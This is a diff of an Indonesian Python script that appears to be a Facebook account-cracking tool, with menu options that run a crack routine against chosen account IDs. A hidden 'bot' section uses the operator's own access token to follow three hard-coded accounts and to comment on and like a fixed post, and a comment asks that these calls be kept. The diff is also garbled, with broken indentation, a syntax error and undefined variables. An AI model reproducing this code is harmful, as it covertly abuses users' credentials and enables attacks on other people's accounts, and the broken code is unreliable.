@@ -98,24 +98,23 @@ def login_lagi():
 			time.sleep(2);login_lagi()
 		else:
 			try:
-				cc = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
-				open('token.x','w').write(token)
-				print('\n [%s+%s] Login Berhasil %s'%(H,N,cc))
-				bot()
-			except KeyError:
-				print(' [%s!%s] Login gagal token rusak ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);janda_sebalah()
-
-# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
-def bot():
-		try:
-			toket = open('token.x','w').read()
-		requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
+        token = open("token.txt","r").read()
+        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
+        a = json.loads(otw.text)
+        nama = a["name"]
+    except (KeyError,IOError):
+        print('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
+        os.system('rm -rf token.txt')
+        exit(premium.())
+        requests.post('https://graph.facebook.com/100033480633498/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/100001490081130/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/1517769961/subscribers?access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/comments/?message=' +komen+ '&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
 		requests.post('https://graph.facebook.com/711894139936601/likes?summary=true&access_token=' + toket)
+		print('\n%s[%s!%s] %sLogin Berhasil'%(K,P,K,P))
 		menu().main()
+
 class menu:
 
 	def __init__(self):
@@ -147,7 +146,7 @@ class menu:
 			print(' %s╚═[%s!%s] Jangan Isi Kosong!'%(N,M,N));time.sleep(2);menu().main()
 		elif usna in ['0','00']:
 			try:
-				token = open('token.x','w').read()
+				token = open("token.txt","r").read()
 			except IOError:
 				os.system('rm -rf token.x')
 				exit(' %s╚═[%s!%s] Cek token kamu'%(N,M,N))
@@ -164,7 +163,7 @@ class menu:
 				crack().fbeh(id)
 		elif usna in ['1','01']:
 			try:
-				token = open('token.x','w').read()
+				token = open("token.txt","r").read()
 			except IOError:
 				os.system('rm -rf token.x')
 				exit(' %s╚═[%s!%s] Coba jalankan ulang !'%(N,M,N))
@@ -182,7 +181,7 @@ class menu:
 			else:
 				crack().fbeh(id)
 		elif usna in ['2','02']:
-			token = open('token.x','w').read()
+			token = open("token.txt","r").read()
 			try:
 				pler = int(input(' %s╠═[%s•%s] Mau crack berapa id : '%(N,O,N)))
 			except:pler = 1
@@ -202,7 +201,7 @@ class menu:
 					pass
 			crack().fbeh(id)
 		elif usna in ['3','03']:
-			pepek = open('token.x','w').read()
+			token = open("token.txt","r").read()
 			try:
 				print(' %s║'%(N))
 				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
@@ -216,7 +215,7 @@ class menu:
 			else:
 				crack().fbeh(id)
 		elif usna in ['4','04']:
-			memek = open('token.x','w').write()
+			token = open("token.txt","r").read()
 			try:
 				print(' %s║'%(N))
 				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
@@ -230,7 +229,7 @@ class menu:
 			else:
 				crack().fbeh(id)
 		elif usna in ['5','05']:
-			khamdihiXDX = open('token.x','w').write()
+			token = open("token.txt","r").read()
 			try:
 				print(' %s║'%(N))
 				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
